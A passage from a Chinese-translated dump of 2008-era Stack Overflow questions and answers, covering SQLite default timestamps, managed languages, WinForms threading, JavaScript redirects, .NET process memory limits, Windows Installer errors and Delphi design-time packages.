 (newline)
 (indent-according-to-mode)
 (newline)
 (indent-according-to-mode)
 (insert "} /* endif */")
 (indent-according-to-mode)
 (newline)
 (indent-according-to-mode)
 (previous-line 3)
 (end-of-line)
 (goto-char (- (point) 3))
)

;; bind it to CTRL-c i
(define-key Ctl-C-keymap "i" 'pm-if) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T08:49:31.283

看看[QDevelop](http://qdevelop.free.fr/) - 它非常简单，但具有 qt 应用程序的特色 ide/editor。5 分钟查看源文件给了我一种添加右键菜单项的方法：) 重现步骤：

1.  下载源代码，尝试构建 - 我对此没有任何问题

2.  运行，右键单击编辑器窗口中的一些文本 - 例如那里有一个“Goto Implementation”项目

3.  该文本在**src/textEdit.cpp**文件中为：

    connect(menu->addAction(QIcon(":/treeview/images/cpp.png"), tr("Goto Implementation")), SIGNAL(triggered()), this, SLOT(slotGotoImplementation()) );

因此， slotGotoImplementation() - 是一个将被调用的函数。以与那里实施的所有其他操作一样的方式添加您的操作。

网站上有一些关于向编辑器编写**插件**的信息——这可能是扩展功能的更好方法，但将一些代码添加到源代码似乎更容易。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-15T17:13:04.480

Acme [http://plan9.bell-labs.com/sys/doc/acme/acme.ps](http://plan9.bell-labs.com/sys/doc/acme/acme.ps)

这是 Linux 端口 [http://swtch.com/plan9port/](http://swtch.com/plan9port/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-14T12:19:29.847

查看[代码块](http://www.codeblocks.org/)以及如何为其编写插件。这是向当前应用程序添加新功能的最简单方法。[这](http://www.codeblocks.org/cbplugins)应该是为代码块做插件的一个很好的起点。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-17T13:32:19.837

看看[安居塔](http://anjuta.sourceforge.net/)。它是一个用于 GNOME/Glib 类型应用程序的 IDE，据我所知，它是用 C 语言编写的，并且有一个应该有用的插件框架。

# sql - sqlite 数据库默认时间值 'now'

> ID：200309
> 
> 赞同：211
> 
> 时间：2008-10-14T07:56:27.897
> 
> 标签：sql, sqlite

是否可以在 sqlite 数据库中创建一个具有默认为的时间戳列的表`DATETIME('now')`？

像这样：

```
CREATE TABLE test (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    t TIMESTAMP DEFAULT DATETIME('now')
); 
```

这给出了一个错误......如何解决？

* * *

## 回答 #1

> 赞同：322
> 
> 时间：2008-10-14T08:01:44.233

我相信你可以使用

```
CREATE TABLE test (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  t TIMESTAMP
  DEFAULT CURRENT_TIMESTAMP
); 
```

从 3.1 版开始（[来源](http://www.sqlite.org/lang_createtable.html)）

* * *

## 回答 #2

> 赞同：107
> 
> 时间：2008-10-23T00:44:24.457

根据博士。hipp 在最近的列表帖子中：

```
CREATE TABLE whatever(
     ....
     timestamp DATE DEFAULT (datetime('now','localtime')),
     ...
); 
```

* * *

## 回答 #3

> 赞同：56
> 
> 时间：2009-04-15T22:47:15.980

这只是一个语法错误，你需要括号：`(DATETIME('now'))`

如果您查看[文档](http://www.sqlite.org/syntaxdiagrams.html#column-constraint)，您会注意到在语法中的 'expr' 选项周围添加的括号。

* * *

## 回答 #4

> 赞同：25
> 
> 时间：2014-09-30T17:52:54.047

这是基于问题的其他答案和评论的完整示例。在示例中，时间戳 ( `created_at`-column) 保存为[unix epoch](http://en.wikipedia.org/wiki/Unix_time) UTC 时区，仅在必要时转换为本地时区。

使用 unix epoch 可以节省存储空间 - 当存储为 ISO8601 字符串时，4 字节整数与 24 字节字符串，请参阅[datatypes](http://www.sqlite.org/datatype3.html)。如果 4 字节不够，可以增加到 6 或 8 字节。

在 UTC 时区保存时间戳可以方便地在多个时区显示合理的值。

SQLite 版本是 3.8.6，随 Ubuntu LTS 14.04 一起提供。

```
$ sqlite3 so.db
SQLite version 3.8.6 2014-08-15 11:46:33
Enter ".help" for usage hints.
sqlite> .headers on

create table if not exists example (
   id integer primary key autoincrement
  ,data text not null unique
  ,created_at integer(4) not null default (strftime('%s','now'))
);

insert into example(data) values
 ('foo')
,('bar')
;

select
 id
,data
,created_at as epoch
,datetime(created_at, 'unixepoch') as utc
,datetime(created_at, 'unixepoch', 'localtime') as localtime
from example
order by id
;

id|data|epoch     |utc                |localtime
1 |foo |1412097842|2014-09-30 17:24:02|2014-09-30 20:24:02
2 |bar |1412097842|2014-09-30 17:24:02|2014-09-30 20:24:02 
```

本地时间是正确的，因为我在查询时位于 UTC+2 DST。

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2013-11-21T12:59:04.550

最好使用 REAL 类型，以节省存储空间。

[引用SQLite 版本 3](http://www.sqlite.org/datatype3.html)中数据类型的 1.2 部分

> SQLite 没有为存储日期和/或时间预留存储类。相反，SQLite 的内置日期和时间函数能够将日期和时间存储为 TEXT、REAL 或 INTEGER 值

```
CREATE TABLE test (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    t REAL DEFAULT (datetime('now', 'localtime'))
); 
```

请参阅[列约束](http://www.sqlite.org/syntaxdiagrams.html#column-constraint)。

并[插入](http://www.sqlite.org/lang_insert.html)一行而不提供任何值。

```
INSERT INTO "test" DEFAULT VALUES; 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2013-04-26T06:50:56.247

这是语法错误，因为您没有写括号

如果你写

> 选择 datetime('now') 然后它会给你 UTC 时间，但如果你写它查询，那么你必须在此之前添加括号所以 (datetime('now')) 为 UTC 时间。本地时间相同 Select datetime('now','localtime') 进行查询

（日期时间（'现在'，'本地时间'））

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2021-02-18T16:00:40.090

如果你想要毫秒精度，试试这个：

```
CREATE TABLE my_table (
    timestamp DATETIME DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now'))
); 
```

不过，这会将时间戳保存为文本。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2019-06-09T00:14:14.700

此替代示例将本地时间存储为整数以保存 20 个字节。该工作在字段默认值、更新触发器和视图中完成。strftime 必须使用 '%s' （单引号），因为 "%s" （双引号）对我抛出了一个 'Not Constant' 错误。

```
Create Table Demo (
   idDemo    Integer    Not Null Primary Key AutoIncrement
  ,DemoValue Text       Not Null Unique
  ,DatTimIns Integer(4) Not Null Default (strftime('%s', DateTime('Now', 'localtime'))) -- get Now/UTC, convert to local, convert to string/Unix Time, store as Integer(4)
  ,DatTimUpd Integer(4)     Null
);

Create Trigger trgDemoUpd After Update On Demo Begin
  Update Demo Set
    DatTimUpd  =                          strftime('%s', DateTime('Now', 'localtime'))  -- same as DatTimIns
  Where idDemo = new.idDemo;
End;

Create View If Not Exists vewDemo As Select -- convert Unix-Times to DateTimes so not every single query needs to do so
   idDemo
  ,DemoValue
  ,DateTime(DatTimIns, 'unixepoch') As DatTimIns -- convert Integer(4) (treating it as Unix-Time)
  ,DateTime(DatTimUpd, 'unixepoch') As DatTimUpd --   to YYYY-MM-DD HH:MM:SS
From Demo;

Insert Into Demo (DemoValue) Values ('One');                      -- activate the field Default
-- WAIT a few seconds --    
Insert Into Demo (DemoValue) Values ('Two');                      -- same thing but with
Insert Into Demo (DemoValue) Values ('Thr');                      --   later time values

Update Demo Set DemoValue = DemoValue || ' Upd' Where idDemo = 1; -- activate the Update-trigger

Select * From    Demo;                                            -- display raw audit values
idDemo  DemoValue  DatTimIns   DatTimUpd
------  ---------  ----------  ----------
1       One Upd    1560024902  1560024944
2       Two        1560024944
3       Thr        1560024944

Select * From vewDemo;                                            -- display automatic audit values
idDemo  DemoValue  DatTimIns            DatTimUpd
------  ---------  -------------------  -------------------
1       One Upd    2019-06-08 20:15:02  2019-06-08 20:15:44
2       Two        2019-06-08 20:15:44
3       Thr        2019-06-08 20:15:44 
```

# c# - C# 或 Java 类型语言的技术术语是什么？

> ID：200310
> 
> 赞同：9
> 
> 时间：2008-10-14T07:56:40.390
> 
> 标签：c#, java, programming-languages, naming

这可能是一个非常简单的问题，但是这类语言的技术术语是什么？

他们使用通过 JVM 或 CLR 发送的“中间”汇编类型语言。它们都是面向对象的，并且都依赖于诸如 Java 虚拟机或公共语言运行时之类的中介来编译为本机语言。

与 Asm/C/C++ 不同，它们不直接编译成本地机器语言，并且需要大量的内存分配知识。他们都使用垃圾收集。

是否有将 Java 和 C# 与 C++ 分开的技术术语？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2008-10-14T07:58:25.007

C++ 和 .NET/Java 之间的一个关键区别是自动回收不再需要的内存。这称为**垃圾收集**。对于此属性，它们被称为**托管**平台。

Java/.NET 都将字节码编译为本机代码延迟到最后一分钟。对于此属性，它们被称为**JIT 编译**（及时）。

C#/Java/C++ 语言被称为**命令式、面向对象的**语言。

.NET 和 Java 中的类型系统只允许可验证的方法调用。对于这个属性，它们被称为**静态类型**。

C#/Java/C++ 是**图灵完备**的，这意味着在实践中，它们可以产生任何计算。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-14T08:00:23.817

这些语言通常被称为“托管”语言。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-14T09:07:00.843

它们有时被称为静态类型的托管编程语言。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-14T07:59:21.323

中间表示更像是运行时系统的属性，而不是语言本身的属性。这些类型的系统通常称为[字节码](http://en.wikipedia.org/wiki/Bytecode)系统。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-14T08:00:35.297

自从 Microsoft 推出 .NET 以来，他们开始使用“托管”一词来区分至少在逻辑上运行在虚拟机上的语言和运行在原始金属上的语言。这个词已经很流行了。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-14T07:58:49.170

“托管”或“内存管理”或“垃圾收集”都是可以接受的术语，以根据内存的分配/收集方式来区分它们，尽管第一个可以说是当今最常见的。

至于编译成中间语言（IL），这取决于它们运行的​​虚拟机（VM）是如何工作的。在 .NET 中，公共语言运行时 (CLR) VM 在 IL 执行之前将其编译为机器代码，这称为即时编译或“JIT 编译”。其他环境实际上并不将代码编译为机器代码，而只是简单地解释它，这要慢得多，这被称为“解释”语言。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-14T08:00:03.550

我相信它将是托管语言。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-14T13:19:27.463

Intermediate "bytecode" representation is just an implementation detail. C++ can be compiled to, say, ANDF (Architecture Neutral Distribution Format). P-code used to be really popular. On the other hand, JavaCards are generally distributed without the ability to run the intermediate form, and there exists direct to machine code Java compilers.

C++ can be Garbage Collected. That should be more explicit in C++0x. Real-Time Java has restricted memory use for real-time threads.

So, a term for Java/C# type languages: Java dialects.

(Java is a trademark of Sun Microsystems, so is JavaScript.)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-14T09:01:16.953

这取决于，如果您谈论的是它们在虚拟机上运行的事实，那么它们被视为 JIT 编译（即时）或字节码（逻辑上 1/2 编译和 1/2 解释）。

如果您在谈论垃圾收集，那么它们就简称为垃圾收集。

这里的关键点是这两个属性是分开的，垃圾收集语言不必有虚拟机，而基于虚拟机的语言不必进行垃圾收集。

例如，Python 是一种具有垃圾收集功能的解释型语言，但它被解释为与在虚拟机上运行相反。

# javascript - JavaScript if 语句返回错误值

> ID：200312
> 
> 赞同：-1
> 
> 时间：2008-10-14T07:58:13.213
> 
> 标签：javascript, mootools

有谁知道为什么`false`即使传递的字符串是“活动”，这个片段也会返回？

```
if ($('status_'+id).getText()=="Active") 
```

我也尝试将代码更改为

```
if ($('status_'+id).getText()==String("Active")) 
```

和

```
if (String($('status_'+id).getText())=="Active") 
```

仍然没有运气。

我还检查`$('status_'+id).getText()`过`console.log`它是否真的返回“活动”

我想知道为什么它不起作用？有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-14T08:01:31.067

愚蠢的问题：你确定返回的字符串不包含空格吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T08:07:18.247

任何调试任务的第一步都是检查您的假设。使用调试器或一系列警报来检查以下内容：

*   id的价值是什么？
*   $('status_'+id) 是否评估为 DOM 元素？
*   $('status_'+id).getText() 实际返回什么

# c# - 奇怪的跨线程 UI 错误

> ID：200314
> 
> 赞同：6
> 
> 时间：2008-10-14T07:58:32.743
> 
> 标签：c#, string, literals, multithreading

我正在编写一个 WinForms 应用程序，它有两种模式：控制台或 GUI。同一解决方案中的三个项目，一个用于控制台应用程序，一个用于 UI 表单，第三个用于保存两个界面也将连接的逻辑。控制台应用程序运行绝对流畅。

一个保存用户选择的模型，它有一个`IList<T>`where T 是一个本地对象，`Step`它实现`INotifyPropertyChanged`了 ，所以在 UI 中它被挂载到一个 DataGridView 上。运行时一切正常，对象的初始状态反映在屏幕上。

每个`Step`对象都是一个任务，依次执行；一些属性会改变，被反射回 IList 并传递给 DataGridView。

UI 版本中的此操作是通过创建 BackgroundWorker 将事件返回给 UI 来完成的。执行此`Step`操作并生成一个`StepResult`对象，该对象是一个指示结果（例如 Running、NotRun、OK、NotOK、Caveat）的枚举类型和一个指示消息的字符串（因为该步骤已运行但不完全符合预期，即带有警告）。通常，这些操作将涉及数据库交互，但在调试模式下，我会随机生成一个结果。

如果消息为空，则永远不会有问题，但是如果我生成这样的响应：

```
StepResult returnvalue = new StepResult(stat, "completed with caveat") 
```

我收到一条错误消息，指出 DataGridView 是从创建它的线程以外的线程访问的。（我通过一个自定义处理程序传递它，该处理程序应该在需要时处理调用 - 也许它没有？）

然后，如果我生成一个独特的响应，例如使用随机数`r`：

```
StepResult returnvalue = new StepResult(stat, r.ToString()); 
```

操作成功，没有问题，数字被干净地写入 DataGridView。

我很困惑。我假设它在某种程度上是一个字符串文字问题，但任何人都可以提出更清晰的解释吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T08:10:09.897

您已经回答了自己的问题：-

> 我收到一条错误消息，指出 DataGridView 是从创建它的线程以外的线程访问的。

WinForms 坚持所有对表单和控件执行的操作都是在创建表单的线程的上下文中完成的。这样做的原因很复杂，但与底层的 Win32 API 有很大关系。有关详细信息，请参阅[The Old New Thing](http://blogs.msdn.com/oldnewthing/)博客上的各种条目。

您需要做的是使用 InvokeRequired 和 Invoke 方法来确保始终从同一线程访问控件（伪代码）：

```
object Form.SomeFunction (args)
{
  if (InvokeRequired)
  {
    return Invoke (new delegate (Form.Somefunction), args);
  }
  else
  {
    return result_of_some_action;
  }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T09:28:09.550

由于您正在通过事件订阅进行 UI 绑定，[您可能会发现这很有帮助](http://groups.google.co.uk/group/microsoft.public.dotnet.languages.csharp/browse_thread/thread/214e55884b16f4d9/f12a3c5980567f06#f12a3c5980567f06)；这是我不久前写的一个例子，它展示了如何子类`BindingList<T>`化，以便将通知自动编组到 UI 线程。

如果没有同步上下文（即控制台模式），那么它会恢复为简单的直接调用，因此没有开销。在 UI 线程中运行时，请注意这实质上使用`Control.Invoke`，如果它在 UI 线程上，它本身只是直接运行委托。因此，如果数据是从非 UI 线程编辑的，则只有任何开关 - 正是我们想要的；-p

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T10:48:04.913

我发现这篇文章 - “[从不同的线程更新 IBindingList](http://social.msdn.microsoft.com/Forums/en-US/netfxbcl/thread/186338b6-2fe1-4d41-bab5-c35bf64a6b8d/) ” - 将责任归咎于 BindingList -

> 由于没有为异步操作设置 BindingList，因此您必须从控制它的同一线程更新 BindingList。

显式地将父表单作为对象传递并为该技巧`ISynchronizeInvoke`创建一个包装器。`BindingList<T>`

# java - 将 Web 内容存储在 JAR 文件中

> ID：200319
> 
> 赞同：11
> 
> 时间：2008-10-14T07:59:21.493
> 
> 标签：java, jakarta-ee, web-applications, jar, web-content

是否可以将 Web 内容（例如 JSP、HTML、图像、CSS 等）存储在 JAR 文件中？

我一直在研究模块化 Web 应用程序的各种选项，这是一种可能性。

我们目前正在将 JSF 和 Facelets 用于我们的视图技术——我认为可以编写某种形式的自定义视图解析器来检查类路径而不是文件系统目录，但我不确定这是否可行。

任何想法，将不胜感激！:)

更新：我可能应该澄清一下。如何让 Web 容器（例如 Tomcat）从 JAR 文件中加载资源？例如，我在我的 Web 应用程序中部署了一个 .war 文件。如果我访问 /index.jsp，容器将尝试在 Web 内容目录中查找名为 index.jsp 的文件。

有没有一种简单的方法可以使用 Tomcat 等配置您自己的资源加载器，以便它搜索类路径和文件系统？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T09:58:27.463

Yes, it is possible to store files e.g. properties, xml, xslt, image etc; in a JAR (or WAR) file and pull them at runtime.

To load a resource from your deployment jar, use the following code.

```
this.getClass().getClassLoader().getResourceAsStream( filename ) ; 
```

In a maven project, folders & files placed in resources are included in the jar. The filename is relative to the root of jar file, so "./filename.xml" would match the file filename.xml placed in "/src/java/resources".

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2010-11-05T19:48:03.513

如果您使用 Maven 构建您的 webapp，您可以构建您的资源的 WAR，并在构建时将该 WAR 覆盖到您的 webapp WAR 上。

包含所有 JSP、图像、CSS 等的资源 WAR 被称为“覆盖”，它只是目标 Web 应用程序中类型设置为“war”的依赖项。

当你打包你的 webapp 时，资源 WAR 只会复制非冲突文件。因此，如果您的项目中有一个唯一的 index.jsp，并且想在覆盖中使用它而不是 index.jsp，只需将其包含在您的目标 webapp 中，Maven 就不会复制该资源。

[有关覆盖的 Maven War 插件页面](http://maven.apache.org/plugins/maven-war-plugin/overlays.html)的更多信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T08:08:09.120

绝对地。哎呀，您可以将内容直接存储在 WAR 文件中，该文件基本上是一个带有一些额外位的 JAR 文件。是的，您可能需要编写一个自定义解析器来使用 ClassLoader.getResourceAsStream，但基本上，由于您可以根据自己的喜好生成内容，因此从 jar 文件中获取内容似乎非常合理。您可能希望确保它只获取一组非常特定的扩展:)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-16T09:59:06.523

您还可以使用 weblets 项目（请参阅[https://weblets.dev.java.net/](https://weblets.dev.java.net/)）。

您将一些资源存储在 JAR 库中（例如图像、css、javascript...），然后编写一个非常简单的 weblet-config.xml。然后在 JSF 页面中，您可以使用以下语法直接引用它们：

```
<h:graphicImage src="weblet://some-name/images/someimage.jpg" .../> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-16T10:12:01.257

标记文件就像可以放在 jar 中的 JSP 片段。使用标签文件可以帮助你，但我从未尝试在 jar 中使用图像、CSS 等。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-07-04T15:40:19.303

在 Core JavaServer Faces，第 3 版中，在第 30 页的“在 JAR 中打包复合组件”下。382，它谈到在 JAR 文件中打包复合组件。

“您所要做的就是将您的复合组件及其工件（例如 JavaScript、样式表或属性文件）放在 JAR 中的 META-INF 目录下，如图 9-14 所示。”

```
components.jar
+-- META-INF
    +-- resources
        +-- css
        |   +-- styles.css
        +-- images
        |   +-- back.png
        +-- util
            +-- icon.xhtml
            +-- login.js
            +-- login.properties 
```

我不确定从其他应用程序直接访问这些资源有多么容易，而不是包含的复合组件。

# c# - 从另一个安装程序卸载一个安装程序 - 错误 1618

> ID：200330
> 
> 赞同：0
> 
> 时间：2008-10-14T08:01:46.357
> 
> 标签：c#, installation, windows-installer, uninstallation

我创建了一个自定义安装程序 dll，一切正常。我只想`Uninstall`从我当前的安装中调用另一个安装程序的方法。当我这样做时，我得到`error code 1618`（表示另一个安装程序已经在运行）。但是，当我从测试项目中调用`uninstall`同一产品时，它工作正常。

任何人都可以提出解决方案吗？

我可以从当前安装程序中卸载另一个应用程序吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-14T09:05:39.160

不支持从另一个安装程序调用安装程序（安装或卸载）的 AFAIK。它在早期版本的 Windows Installer 中受支持，但现在已被弃用，即便如此我也不确定是否支持卸载其他产品。现在推荐的方法是使用引导程序来检查和安装任何先决条件。从理论上讲，您还应该能够使用自定义引导程序卸载产品，但是编写一个程序并不是一件容易的事。同样从用户机器上默默地卸载某些东西也不一定是一件好事。使用 Visual Studio 2005 通用引导程序，您应该能够生成一个引导程序来检查是否安装了其他产品并要求用户卸载它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T08:25:59.753

如果这个其他产品是您自己的（因此您可以访问安装程序应该执行的操作），或者您想做一些肮脏的事情，您可以尝试自己删除文件/注册表项/等，然后在注册表中取消注册程序（`HKEY_LOCAL(MACHINE|USER)\Software\Microsoft\Windows\CurrentVersion\Uninstall\{PROGRAM}`）。这不是有史以来最伟大的想法，但如果您可以访问安装程序应该执行的操作，那么它会为您工作。

# migration - 我可以从 ClearCase 迁移到 Serena VM 吗？

> ID：200331
> 
> 赞同：3
> 
> 时间：2008-10-14T08:02:32.843
> 
> 标签：migration, clearcase, pvcs, serena

我有一个使用**Rational ClearCase Explorer 2003.06.10+**的存储库，我想将它迁移到**Serena ChangeMan Version Manager 8.1.4.2**中。

这可能吗？**ClearCase**存储库并没有用于它的所有功能，只是作为保存文档副本的地方，所以我唯一需要保留的是文件及其版本历史。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-14T16:41:32.237

我推荐的方法是通过 ClearCase 动态视图：

*   一次列出所有标签，
*   对于每个标签，检查文件是在哪个分支中可视化的，并将使用最多的分支放在 /main 中（因此对于 400 个文件，如果其中 3 个在分支“补丁”中，则将其视为导出 -- 源 -- 分支“补丁”之一）
*   在 Serena 中创建/重用对应的分支到导出分支，所以这里有一个分支 'patch'
*   从该动态视图中导入（创建项目）在 Serena 中，并记住目录的版本控制方式与它们在 ClearCase 中的方式不同。因此，您将丢失目录历史记录，但将保留文件的主要历史记录，即收到标签的版本。

关键是从最旧的标签到最新的标签，边走边重新创建分支，只导入标签版本。

这有帮助吗？

# javascript - 自动将某人重定向到另一个网页的最佳方法是什么？

> ID：200337
> 
> 赞同：49
> 
> 时间：2008-10-14T08:06:21.323
> 
> 标签：javascript, browser, redirect

我从来没有学过 JavaScript，但我想这是一个非常简单的问题。只是想知道这些天最推荐哪种方法。

* * *

## 回答 #1

> 赞同：113
> 
> 时间：2008-10-14T08:07:29.043

```
// use this to avoid redirects when a user clicks "back" in their browser
window.location.replace('http://somewhereelse.com');

// use this to redirect, a back button call will trigger the redirection again
window.location.href = "http://somewhereelse.com";

// given for completeness, essentially an alias to window.location.href
window.location = "http://somewhereelse.com"; 
```

**编辑**：看起来发布更好答案的用户已经离开了，我在这里合并了他的答案。

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2008-10-14T08:19:36.103

最推荐？不这样做。[HTTP**比**JavaScript更适合这项工作](http://www.w3.org/QA/Tips/reback)（搜索引擎跟随它们，你可以说明它是否是永久性的，它们更快，等等）。

做不到……

如果您想要立即重定向：

```
window.location.replace('http://example.com/');
```

这将用浏览器历史记录中的新 URI 替换当前 URI，因此后退按钮不会将用户带到立即再次向前抛出的页面。

如果您真的不想重定向，但想将用户发送到某处以响应事件：

```
window.location.href = 'http://example.com/';
```

记住要有一个非 JavaScript 的后备。链接通常是最好的选择，但它确实取决于上下文。

延时重定向是一个更糟糕的主意。使用它们的唯一原因是如果您想向用户显示消息 - 并且用户以不同的速度阅读内容（并且让他们在执行其他操作时坐在另一个选项卡中）。如果消息足够重要，可以显示，那么它应该足够重要，可以留在屏幕上，直到用户阅读并单击指向下一页的链接。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-14T08:08:51.333

使用 JavaScript 重定向页面时要记住的一件重要事情是，始终提供非 JavaScript 重定向！一个链接可以做，或者更好的一个`<META>`标签，例如：`<meta http-equiv="refresh" content="2;url=http://example.com">`

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-14T08:20:25.710

这些天来，我认为最建议的方法是[不要进行 javascript](http://en.wikipedia.org/wiki/URL_redirection#JavaScript_redirects)（或元）重定向。你真的需要吗？您可以改用重定向 HTTP 标头吗？

W3C 的 Web 内容可访问性指南 (7.4) 也不鼓励创建自动刷新页面，因为大多数 Web 浏览器不允许用户禁用或控制刷新率

# .net - 单个 .NET 进程是否有内存限制

> ID：200348
> 
> 赞同：39
> 
> 时间：2008-10-14T08:11:11.610
> 
> 标签：.net, memory, .net-3.5, process, limit

我们目前正在考虑构建一个缓存系统来保存从 SQL 数据库中提取的数据，并使其可用于其他几个应用程序（网站、Web 服务等）。我们想象缓存作为 Windows 服务运行，并且基本上由一个保存缓存条目的智能字典组成。我的问题是，应用程序的工作集是否有限制（它将在 windows server 2003 下运行）？还是物理内存的数量是限制？

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2008-10-14T08:15:49.340

32位还是64位？32bit是2gb（一个进程），64bit是[1TB（企业版2003服务器）](http://msdn.microsoft.com/en-us/library/aa366778(VS.85).aspx#physical_memory_limits_windows_server_2003)。

但是，即使在 64 位上[，CLR 对象的最大大小也是 2gb 。](http://blogs.msdn.com/joshwil/archive/2005/08/10/450202.aspx)

**更新：**上述信息在 2008 年是正确的。有关更多最新信息，请参阅[Ohad 的回答](https://stackoverflow.com/a/3739143/21574)。Windows 2016 服务器最大可以有[24TB](https://msdn.microsoft.com/en-us/library/aa366778(VS.85).aspx#physical_memory_limits_windows_server_2016)。

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2009-12-15T22:41:34.580

我最近一直在对 .NET 中 32 位进程的内存限制进行广泛的分析。我们都被我们可以在 .NET 应用程序中分配多达 2.4GB (2^31) 的想法轰炸了，但不幸的是，这不是真的 :(。应用程序进程有这么多的空间可以使用，并且操作系统做得很好然而，为我们管理它的工作，.NET 本身似乎有自己的开销，对于推动内存限制的典型现实世界应用程序来说，这大约占 600-800MB。这意味着，一旦您分配一个整数数组，大约需要1.4GB，您应该会看到 OutOfMemoryException()。

显然，在 64 位中，这个限制发生得更晚（让我们在 5 年后聊聊 :)），但由于字长增加，内存中所有内容的一般大小也会增长（我发现它是 ~1.7 到 ~2 倍）。

我可以肯定的是，操作系统的虚拟内存理念绝对不会在一个进程中为您提供几乎无限的分配空间。只有这样才能将全部 2.4GB 的内存分配给一次运行的所有（许多）应用程序。

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2010-09-17T21:24:16.643

来自[MSDN](http://msdn.microsoft.com/en-us/library/aa366778%28VS.85%29.aspx#memory_limits)的下表是您查询的最准确答案。请注意，不能直接从托管编译器设置 IMAGE_FILE_LARGE_ADDRESS_AWARE 标志，但幸运的是它可以[通过 editbin 实用程序](https://stackoverflow.com/questions/1346480/how-to-make-a-net-application-large-address-aware/1346510#1346510)在构建后设置。4GT 指的是 /3gb 标志。

![替代文字](https://i.stack.imgur.com/V7bMU.png)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-14T08:27:21.890

在 32 位 Windows 上，您可以通过使用 /3gb 标志启动 Windows 并将您的应用程序标记为“大地址感知”来获得更多内存

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-15T15:01:30.377

马蒂亚斯，

实际上不是直接问题的答案，而是解决此问题的另一种方法，它将绕过一些大陷阱，这可能是缓存解决方案的主要问题。（对不起，我没有任何关于此事的推荐读物。）

我们在之前的项目中实现了这一点，但它确实产生了其他问题。

对于离线访问，您可以在桌面上使用 sql express 来创建数据库的镜像（或者只是您需要缓存的位）吗？然后您需要做的就是切换您的应用程序指向的数据库。您甚至可以使用它存储差异并将它们重播到服务器 - 尽管这还有其他问题。您可以更改本地副本的权限，以使其成为只读副本（如果应该是这样的话）。

您正在考虑创建的字典听起来非常像 Sql 索引。如果你能以这种方式构建它，我会依靠 sql 为你完成这项工作。为什么要重新发明那个轮子？如果你这样做了，你将不得不仔细考虑缓存过期和内存管理——特别是如果这是一个 Windows 服务。

祝你好运，

山姆

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T08:15:00.323

与任何其他 Windows 程序一样，您受到地址空间的限制。即：在 32 位上，您可以拥有 2GB 的地址空间。在 x64 上，您可以拥有 8TB。

如果您没有 8TB 的物理内存，它将开始分页。

# asp.net-mvc - 对路线进行单元测试

> ID：200354
> 
> 赞同：1
> 
> 时间：2008-10-14T08:14:52.087
> 
> 标签：asp.net-mvc, unit-testing

假设我定义了一条路线：

```
 routes.Add(new Route("Users/{id}", new MvcRouteHandler())
            {
                Defaults = new RouteValueDictionary(new { controller ="UserInfo", action = "UserInformation",
                id = ""}),
            }); 
```

那么，我将如何创建一个单元测试以确保当 URL 中出现 Users/123 时，肯定会调用操作方法*UserInformation ，并以 123 作为参数？*

我之所以问这个问题是因为我在指定 RouteValueDictionary 时可能输入了错误的名称，我可能在 UserInformation 的速度上输入了错误的 UserInformationss。有没有办法防止这种情况发生？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T16:28:42.107

测试是否调用了操作 UserInformation 并不重要。唯一重要的是确保在指定 URL 时，“UserInformation”在带有键“action”的路由值字典中，并且有一个具有适当控制器名称的“控制器”值。

如果是这样，MVC 框架保证将调用 UserInformation 方法。您无需通过单元测试来测试*我们的*代码，只需您自己的即可。如果我们的代码不正确，请告诉我们，我们将为我们的代码添加单元测试。:)

# delphi - 在项目基础上加载 Delphi 设计时包

> ID：200358
> 
> 赞同：12
> 
> 时间：2008-10-14T08:16:51.897
> 
> 标签：delphi

有没有办法在项目基础上选择设计时包？

包在大型项目中非常有用，可以保持构建时间可接受，但它们在那些大型项目中也是一个真正的皮塔。当一个开发人员添加一个新包时，它会中断为所有其他人构建，直到他们在他们的机器上安装新包。然后是包的版本控制......

那么有没有人为此提供适当的解决方案？（它已经困扰我多年了）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-14T10:02:45.317

